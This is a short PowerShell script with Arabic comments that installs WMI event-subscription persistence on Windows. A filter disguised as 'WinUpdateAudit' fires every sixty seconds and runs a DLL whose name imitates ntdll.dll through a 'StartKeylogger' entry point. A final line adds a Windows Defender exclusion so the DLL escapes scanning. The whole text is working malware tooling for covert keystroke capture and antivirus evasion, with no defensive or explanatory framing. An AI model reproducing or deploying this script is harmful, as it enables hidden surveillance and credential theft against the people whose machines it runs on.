# 1. إنشاء الفلتر (متى يشتغل؟ بعد دقيقة من إقلاع الويندوز)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "WinUpdateAudit"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

# 2. إنشاء الأمر (شو يشغل؟ الـ DLL تبعنا)
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "WinUpdateAuditConsumer"
    CommandLineTemplate = "rundll32.exe C:\Windows\SysWOW64\ntidll.dll,StartKeylogger"
}

# 3. الربط بينهم (الدمج)
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter.Path
    Consumer = $Consumer.Path
}

Add-MpPreference -ExclusionPath "C:\Windows\SysWOW64\ntidll.dll"
